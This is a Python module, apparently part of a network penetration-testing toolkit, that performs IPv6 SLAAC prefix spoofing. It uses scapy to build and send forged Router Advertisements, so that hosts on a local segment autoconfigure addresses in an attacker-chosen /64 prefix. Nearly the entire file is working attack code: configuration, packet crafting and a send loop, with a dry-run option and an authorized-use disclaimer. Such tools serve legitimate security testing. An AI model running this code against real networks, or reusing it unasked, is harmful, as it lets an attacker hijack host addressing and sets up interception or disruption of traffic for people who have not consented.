"""SLAAC prefix spoofing: advertise a fraudulent /64 so hosts configure addresses inside it.

Hosts build their own IPv6 addresses from the prefixes in Router Advertisements (RFC 4862). The
Prefix Information option is not authenticated on a plain Ethernet segment. A host that receives an
RA with the autonomous flag set adds an address in the advertised prefix, even when the sender is not
a router.

This module sends RAs with a router lifetime of zero, so the sender is not offered as a default
router, and one Prefix Information option with the autonomous flag set. The effects to measure are
whether listening hosts configure an address in the fraudulent prefix, and whether their default
router stays the same.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import (
    ICMPv6ND_RA,
    ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptSrcLLAddr,
    IPv6,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import (
    ALL_NODES_IP,
    ALL_NODES_MAC,
    link_local_from_mac,
)

MAX_FRAMES = 100
MAX_LIFETIME = 0xFFFFFFFF


def validate_prefix(prefix: str) -> ipaddress.IPv6Network:
    try:
        network = ipaddress.IPv6Network(prefix, strict=False)
    except ValueError as exc:
        raise ValueError(f"Prefix {prefix!r} is not an IPv6 network.") from exc
    if network.prefixlen != 64:
        raise ValueError("Advertised prefix must be a /64 for SLAAC.")
    return network


@dataclass(frozen=True)
class SlaacPrefixSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the victims
    source_mac: str                     # the Ethernet and link-local source MAC (required)
    prefix: str = "2001:db8:bad:1::/64" # the fraudulent /64 the hosts configure addresses in
    valid_lifetime: int = 86400         # seconds the prefix stays valid on the host
    preferred_lifetime: int = 14400     # seconds the addresses stay preferred; at most valid_lifetime
    frames: int = 3                     # RAs sent, to keep the prefix fresh
    dry_run: bool = False               # build RAs but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        validate_prefix(self.prefix)
        if not 1 <= self.valid_lifetime <= MAX_LIFETIME:
            raise ValueError(f"Valid lifetime must be between 1 and {MAX_LIFETIME} seconds.")
        if not 0 <= self.preferred_lifetime <= self.valid_lifetime:
            raise ValueError("Preferred lifetime must be between 0 and the valid lifetime.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class SlaacPrefixSpoofingStats:
    frames: int = 0
    status: str = ""


def build_advertisement(config: SlaacPrefixSpoofingConfig) -> Packet:
    """One RA with router lifetime 0 and one autonomous Prefix Information option for the fraudulent /64."""
    network = validate_prefix(config.prefix)
    source = normalize_unicast_mac(config.source_mac)
    return (
        Ether(src=source, dst=ALL_NODES_MAC)
        / IPv6(src=link_local_from_mac(source), dst=ALL_NODES_IP, hlim=255)
        / ICMPv6ND_RA(routerlifetime=0, reachabletime=0, retranstimer=0)
        / ICMPv6NDOptSrcLLAddr(lladdr=source)
        / ICMPv6NDOptPrefixInfo(
            prefixlen=64, L=1, A=1,
            validlifetime=config.valid_lifetime, preferredlifetime=config.preferred_lifetime,
            prefix=str(network.network_address),
        )
    )


def run_slaac_prefix_spoofing(
    config: SlaacPrefixSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[SlaacPrefixSpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> SlaacPrefixSpoofingStats:
    """Send `frames` Router Advertisements with the fraudulent prefix, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = SlaacPrefixSpoofingStats(
            status=(
                f"Dry run: would send {config.frames} Router Advertisement(s) with router lifetime 0 and the "
                f"autonomous prefix {config.prefix}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = SlaacPrefixSpoofingStats()
    frame = build_advertisement(config)
    for _ in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} advertisement(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
